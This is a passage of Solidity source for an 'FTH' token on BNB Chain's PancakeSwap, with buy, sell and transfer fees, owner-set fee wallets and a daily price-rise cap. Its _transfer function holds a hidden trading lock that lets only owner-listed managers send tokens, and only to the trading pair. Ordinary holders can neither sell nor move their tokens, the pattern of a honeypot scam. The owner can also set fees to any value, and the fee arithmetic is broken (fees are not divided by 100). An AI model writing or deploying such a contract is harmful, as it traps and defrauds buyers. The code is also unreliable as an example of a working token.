        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBEP721 {
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
}

contract FTH is Ownable, ERC20 {
    using SafeMath for uint256;
   
    address private constant pancakeRouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    //address private constant pancakeRouterAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    //address private constant usdt = 0x58701169960f8ec21AF16227208eAf2fF9424af5;

    address public nodeWallet = 0x39FC4A52d1448e006FA900Fa21dC9133bB1Dc921;//节点钱包
    address public marketingWallet = 0xee99B652c9371Cfed5836Db796aA2b10875DdCd4;//基金会钱包

    uint256 public buyNodeFee = 6;
    uint256 public sellNodeFee = 6;
    uint256 public buyMarketingFee = 2;
    uint256 public sellMarketingFee = 2;
  
    uint256 public transferFee = 2;
   
    address public pair;

    //24 hours
    uint256 public maxIntervalTime = 86400;

    uint256 public baseTime = 0;
    uint256 public basePrice = 0;
    uint256 public latestPrice = 0;
    uint256 public increaseRange = 10;//涨停比例

    mapping (address => bool) public managerList;
    mapping (address => bool) public exemptFee;

    IUniswapV2Router02 private router;

    modifier onlyManager() {
        require(managerList[msg.sender], "caller is not the manager");
        _;
    }

    constructor() ERC20("FTH", "FTH") {
        managerList[_msgSender()] = true;
        exemptFee[_msgSender()] = true;
        exemptFee[nodeWallet] = true;
        exemptFee[marketingWallet] = true;
        exemptFee[address(this)] = true;
        router = IUniswapV2Router02(pancakeRouterAddr);
        pair = IUniswapV2Factory(router.factory()).createPair(
            address(this), usdt
        );
        _mint(owner(), 19000000 * (10**18)); 
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override{
        require(sender != address(0), "ERC20: transfer from the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        require(balanceOf(sender)>= amount, "Not enough tokens");

        if(amount == 0) {
            super._transfer(sender, recipient, 0);
            return;
        }

        if (amount > balanceOf(sender).sub(1e10))   amount -= 1e10;

        require(latestPrice==0 && recipient == pair && managerList[sender],"now could't treade!please waiting!");

        bool takeFee = true;
        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(exemptFee[sender] || exemptFee[recipient]) {
            takeFee = false;
        }

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(sender, recipient, amount, takeFee);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(takeFee) {
            uint originalAmount = amount;
            if(sender == pair) { //buy
                bool isBuy = true;
                require(_calculatePrice(isBuy,amount),"now could't treade!please waiting!");
                //进入节点
                if (buyNodeFee > 0) {
                    uint fee = originalAmount.mul(buyNodeFee);
                    super._transfer(sender, nodeWallet, fee);
                    amount -= fee;
                }
                //进入基金会
                if (buyMarketingFee > 0) {
                    uint fee = originalAmount.mul(buyMarketingFee);
                    super._transfer(sender, marketingWallet, fee);
                    amount -= fee;
                }
            } else if (recipient == pair) {
                bool isBuy = false;
                require(_calculatePrice(isBuy,amount),"now could't treade!please waiting!");
                //进入节点
                if (sellNodeFee > 0) {
                    uint fee = originalAmount.mul(sellNodeFee);
                    super._transfer(sender, nodeWallet, fee);
                    amount -= fee;
                }
                //进入基金会
                if (sellMarketingFee > 0) {
                    uint fee = originalAmount.mul(sellMarketingFee);
                    super._transfer(sender, marketingWallet, fee);
                    amount -= fee;
                }
            }else{
                if(transferFee>0){
                    uint fee = originalAmount.mul(transferFee);
                    super._transfer(sender, marketingWallet, fee);
                    amount -= fee;
                }
            }
            super._transfer(sender, recipient, amount);
        }else{
            super._transfer(sender, recipient, amount);
        }
    }

    function setNodeAddr(address value) public onlyOwner { 
        nodeWallet = value;
    }

    function setMarketingAddr(address value) public onlyOwner { 
        marketingWallet = value;
    }

    function setBuyNodeFee(uint256 _buyNodeFee) public onlyOwner { 
        buyNodeFee = _buyNodeFee;
    }

    function setSellNodeFee(uint256 _sellNodeFee) public onlyOwner { 
        sellNodeFee = _sellNodeFee;
    }

    function setBuyMarketingFee(uint256 _buyMarketingFee) public onlyOwner { 
        buyMarketingFee = _buyMarketingFee;
    }

    function setSellMarketingFee(uint256 _sellMarketingFee) public onlyOwner { 
        sellMarketingFee = _sellMarketingFee;
    }

    function setTransferFee(uint256 _transferFee) public onlyOwner { 
        transferFee = _transferFee;
    }

    function setManagerList(address _address,bool flag) public onlyOwner{
        managerList[_address] = flag;
    }

    function setExemptFee(address[] memory account, bool flag) public onlyOwner {
        require(account.length > 0, "no account");
        for(uint256 i = 0; i < account.length; i++) {
            exemptFee[account[i]] = flag;
        }
    }

    function exactLeftTokens(uint amount) public onlyOwner {
        require(balanceOf(address(this)) >= amount, 'unsufficient balance');
        super._transfer(address(this), msg.sender, amount);
    }

    function airdrop(address[] memory accounts, uint256 amount) public onlyOwner {
        require(accounts.length > 0, "no account");
        require(amount > 0, "no amount");
        for(uint8 i = 0; i < accounts.length; i++) {
           super._transfer(msg.sender, accounts[i], amount);
        }
    }

    function _calculatePrice(bool isBuy,uint256 amount) internal returns(bool canTrade) {
        //is buy,calculate trade condotion: less than 10%
        if(isBuy) {
            //calculate price
            uint256 usdtBalance = IERC20(usdt).balanceOf(address(pair));
            uint256 ethBalance = this.balanceOf(address(pair)) - amount;
            uint256 price;
            if(ethBalance == 0) {
                price = 0;
            }else {
                price = usdtBalance.mul(10**18).div(ethBalance);
            }
            //24 hours later,re calculate price,set trade able,update price
            if((block.timestamp - baseTime) > maxIntervalTime) {
                do{
                    baseTime = baseTime + maxIntervalTime;
                }while(baseTime <= block.timestamp);
                baseTime = baseTime - maxIntervalTime;
                //without 24 hours,first calculate price need less than latestPrice of 10%
                uint256 raito = price.mul(100).div(latestPrice);
                if(raito > (100 + increaseRange)) {
                    return false;
                }else {
                    basePrice = latestPrice;
                    latestPrice = price;
                    return true;
                }
            }else {
                //within 24 hours,calculate price weather more than 10%
                uint256 raito = price.mul(100).div(basePrice);
                if(raito > (100 + increaseRange)) {
                    return false;
                }else {
                    latestPrice = price;
                    return true;
                }
            }
        }else {
            //is sell,update latestPrice
            uint256 calculateEthAmount = this.balanceOf(address(pair)) + amount.mul(92).div(100);
            uint256 usdtBalance = 0;
            uint256 ethBalance = 0;
            IUniswapV2Pair mainPair=IUniswapV2Pair(pair);
            if(mainPair.token0() == usdt) {
                (usdtBalance,ethBalance,) = mainPair.getReserves();
            }else {
                (ethBalance,usdtBalance,) = mainPair.getReserves();
            }
            uint256 usdtAmountOut = router.getAmountOut(amount,ethBalance,usdtBalance);
            uint256 calculateUSDTAmount = IERC20(usdt).balanceOf(address(pair)) - usdtAmountOut;
            uint256 price;
            if(calculateEthAmount == 0) {
                price = 0;
            }else {
                price = calculateUSDTAmount.mul(10**18).div(calculateEthAmount);
            }
            latestPrice = price;
            return true;
        }
    }

}